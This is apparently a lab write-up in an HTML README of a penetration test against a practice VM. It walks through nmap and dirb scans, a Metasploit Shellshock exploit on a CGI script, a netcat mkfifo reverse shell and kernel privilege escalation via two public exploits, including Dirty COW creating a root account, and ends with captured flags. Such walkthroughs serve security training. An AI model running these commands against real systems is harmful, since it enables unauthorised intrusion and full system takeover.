@@ -1,0 +1,204 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.51<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+nmap result<br/>
+<br/>
+# Nmap 7.93 scan initiated Tue Mar &nbsp;7 01:00:42 2023 as: nmap -sC -sV -p- -oN nmap_all_port.txt 10.0.2.51<br/>
+Nmap scan report for 10.0.2.51<br/>
+Host is up (0.000072s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 1024 06cb9ea3aff01048c417934a2c45d948 (DSA)<br/>
+| &nbsp; 2048 b7c5427bbaae9b9b7190e747b4a4de5a (RSA)<br/>
+|_ &nbsp;256 fa81cd002d52660b70fcb840fadb1830 (ECDSA)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.2.22 ((Ubuntu))<br/>
+|_http-title: Site doesn't have a title (text/html).<br/>
+|_http-server-header: Apache/2.2.22 (Ubuntu)<br/>
+MAC Address: 08:00:27:84:D2:90 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+# Nmap done at Tue Mar &nbsp;7 01:00:53 2023 -- 1 IP address (1 host up) scanned in 10.43 seconds<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+dirb result<br/>
+<br/>
+I found suspicious "cgi-bin" directory so I ran dirb search again.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirb http://10.0.2.51/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+-----------------<br/>
+DIRB v2.22 &nbsp; &nbsp;<br/>
+By The Dark Raver<br/>
+-----------------<br/>
+<br/>
+START_TIME: Fri Mar 10 01:22:14 2023<br/>
+URL_BASE: http://10.0.2.51/<br/>
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br/>
+<br/>
+-----------------<br/>
+<br/>
+GENERATED WORDS: 4612 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+---- Scanning URL: http://10.0.2.51/ ----<br/>
++ http://10.0.2.51/cgi-bin/ (CODE:403|SIZE:285) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
++ http://10.0.2.51/index (CODE:200|SIZE:177) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
++ http://10.0.2.51/index.html (CODE:200|SIZE:177) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
++ http://10.0.2.51/server-status (CODE:403|SIZE:290) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+-----------------<br/>
+END_TIME: Fri Mar 10 01:22:15 2023<br/>
+DOWNLOADED: 4612 - FOUND: 4<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirb http://10.0.2.51/cgi-bin/<br/>
+<br/>
+-----------------<br/>
+DIRB v2.22 &nbsp; &nbsp;<br/>
+By The Dark Raver<br/>
+-----------------<br/>
+<br/>
+START_TIME: Fri Mar 10 01:22:37 2023<br/>
+URL_BASE: http://10.0.2.51/cgi-bin/<br/>
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br/>
+<br/>
+-----------------<br/>
+<br/>
+GENERATED WORDS: 4612 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+---- Scanning URL: http://10.0.2.51/cgi-bin/ ----<br/>
++ http://10.0.2.51/cgi-bin/test (CODE:200|SIZE:14) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+-----------------<br/>
+END_TIME: Fri Mar 10 01:22:39 2023<br/>
+DOWNLOADED: 4612 - FOUND: 1<br/>
+<br/>
+In this "http://10.0.2.51/cgi-bin/test" directory I found this message "CGI Default !" so I tried to search about cgi-bin exploit and found this exploit"https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/"<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Exploit using metasploit (Apache mod_cgi Bash Environment Variable Code Injection (Shellshock) )<br/>
+<br/>
+<br/>
+multi/http/apache_mod_cgi_bash_env_exec<br/>
+<br/>
+<br/>
+set TARGETURI /cgi-bin/test<br/>
+<br/>
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set TARGETURI /cgi-bin/test<br/>
+TARGETURI =&gt; /cgi-bin/test<br/>
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set target 1<br/>
+target =&gt; 1<br/>
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; exploit<br/>
+<br/>
+[*] Started reverse TCP handler on 10.0.2.4:4444 <br/>
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)<br/>
+[*] Sending stage (1017704 bytes) to 10.0.2.51<br/>
+[*] Meterpreter session 1 opened (10.0.2.4:4444 -&gt; 10.0.2.51:39198) at 2023-03-07 04:49:14 +0630<br/>
+<br/>
+meterpreter &gt; getuid<br/>
+Server username: www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation (kernel exploit) (3.2.0-23-generic) (Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3) )<br/>
+<br/>
+https://www.exploit-db.com/exploits/33589<br/>
+<br/>
+Before I priv escalate I switch into nc reverse shell from metasploit:<br/>
+<br/>
+meterpreter &gt; shell<br/>
+Process 7160 created.<br/>
+Channel 93 created.<br/>
+bash -i<br/>
+bash: no job control in this shell<br/>
+www-data@ubuntu:/home/sumo$<br/>
+<br/>
+www-data@ubuntu:/tmp$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f<br/>
+&lt;mp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+rm: cannot remove `/tmp/f': No such file or directory<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.51] 48264<br/>
+sh: 0: can't access tty; job control turned off<br/>
+$ whoami<br/>
+www-data<br/>
+$ python -c 'import pty; pty.spawn("/bin/bash")'<br/>
+export TERM=xtermwww-data@ubuntu:/tmp$ <br/>
+export TERM=xterm<br/>
+^Z<br/>
+zsh: suspended &nbsp;nc -lvnp 4444<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# stty raw -echo; fg<br/>
+[1] &nbsp;+ continued &nbsp;nc -lvnp 4444<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;www-data@ubuntu:/tmp$ <br/>
+www-data@ubuntu:/tmp$<br/>
+<br/>
+www-data@ubuntu:/tmp$ nano exploit.c<br/>
+www-data@ubuntu:/tmp$ gcc exploit.c -O2 -o exploit<br/>
+www-data@ubuntu:/tmp$<br/>
+www-data@ubuntu:/tmp$ ./exploit 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+IDT addr = 0xffffffff81dd7000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Using int = 3 with offset = -49063<br/>
+root@ubuntu:/tmp# whoami<br/>
+root<br/>
+<br/>
+root@ubuntu:/root# cat root.txt <br/>
+{Sum0-SunCSR-2020_r001}<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+Another Way to Priv Escalation (40839.c (dirty cow))<br/>
+<br/>
+https://github.com/chacka0101/exploits/blob/master/40839.c<br/>
+<br/>
+www-data@ubuntu:/tmp$ nano dirty.c<br/>
+www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt<br/>
+www-data@ubuntu:/tmp$ ./dirty &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+/etc/passwd successfully backed up to /tmp/passwd.bak &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Please enter the new password: &#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&lt;-------(Enter your new password for firefart root user)<br/>
+Complete line:<br/>
+firefart:fijTltF0M5Bwg:0:0:pwned:/root:/bin/bash<br/>
+<br/>
+mmap: 7fab5c940000<br/>
+madvise 0<br/>
+<br/>
+ptrace 0<br/>
+Done! Check /etc/passwd to see if the new user was created.<br/>
+You can log in with the username 'firefart' and the password 'lol1234'.<br/>
+<br/>
+<br/>
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd<br/>
+Done! Check /etc/passwd to see if the new user was created.<br/>
+You can log in with the username 'firefart' and the password 'lol1234'.<br/>
+<br/>
+<br/>
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd<br/>
+www-data@ubuntu:/tmp$ su firefart<br/>
+Password: <br/>
+firefart@ubuntu:/tmp#<br/>
+firefart@ubuntu:~# id<br/>
+uid=0(firefart) gid=0(root) groups=0(root)<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+www-data@ubuntu:/usr/lib/cgi-bin$ cat local.txt <br/>
+364d35f9813f895127d3afa1a6d51fb9<br/>
+<br/>
+firefart@ubuntu:~# cat proof.txt <br/>
+c4c041ed7de82e76264b522a1e284712</body></html>
